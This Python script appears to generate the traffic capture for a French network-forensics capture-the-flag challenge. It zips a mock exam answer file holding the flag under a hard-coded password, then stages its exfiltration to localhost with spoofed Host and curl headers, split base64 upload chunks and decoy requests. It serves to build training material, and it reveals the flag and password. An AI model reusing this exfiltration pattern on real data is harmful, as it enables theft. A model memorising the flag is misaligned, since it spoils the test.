#!/usr/bin/env python3
import base64, os, subprocess, http.client, shutil

MOT_DE_PASSE = "Exam3n_Blanc_NESD_006"

if shutil.which("zip") is None:
    raise SystemExit("Erreur : l'outil 'zip' est manquant. Installez-le avec : sudo apt install zip")

with open("corrige_examen.txt", "w") as f:
    f.write("Corrige examen blanc - ESD Academy (promo NESD_006)\n")
    f.write("Reponses exfiltrees depuis le dashboard stagiaire\n")
    f.write("Flag : ESD{Antis3ch3_Du_S0C_ESD}\n")

if os.path.exists("corrige.zip"):
    os.remove("corrige.zip")
subprocess.run(["zip", "-P", MOT_DE_PASSE, "corrige.zip", "corrige_examen.txt"],
               check=True, stdout=subprocess.DEVNULL)

archive_base64 = base64.b64encode(open("corrige.zip", "rb").read()).decode()
moitie = len(archive_base64) // 2
morceau_1 = archive_base64[:moitie]
morceau_2 = archive_base64[moitie:]

cle_base64 = base64.b64encode(MOT_DE_PASSE.encode()).decode()

def envoyer(hote, methode, chemin, corps="", entete_extra=None):
    corps = corps.encode()
    connexion = http.client.HTTPConnection("127.0.0.1", 8080)
    connexion.putrequest(methode, chemin, skip_host=True, skip_accept_encoding=True)
    connexion.putheader("Host", hote)
    connexion.putheader("User-Agent", "curl/8.5.0")
    connexion.putheader("Accept", "*/*")
    if entete_extra:
        connexion.putheader(*entete_extra)
    connexion.putheader("Content-Length", str(len(corps)))
    connexion.endheaders()
    connexion.send(corps)
    connexion.getresponse().read()
    connexion.close()

envoyer("dashboard.esdacademy.eu:8080", "GET", "/")
envoyer("forum.esdacademy.eu:8080", "POST", "/message", "auteur=stagiaire&msg=rdv")
envoyer("depot.esdacademy.eu:8080", "POST", "/api/upload", "auteur=stagiaire&action=init",
        entete_extra=("X-Upload-Key", cle_base64))
envoyer("ent.esdacademy.eu:8080", "GET", "/")
envoyer("depot.esdacademy.eu:8080", "POST", "/upload/1", morceau_1)
envoyer("depot.esdacademy.eu:8080", "POST", "/upload/2", morceau_2)

os.remove("corrige_examen.txt")
os.remove("corrige.zip")
print("Trafic genere. Arretez tcpdump puis : mv capture.pcap src/public/capture.pcap")
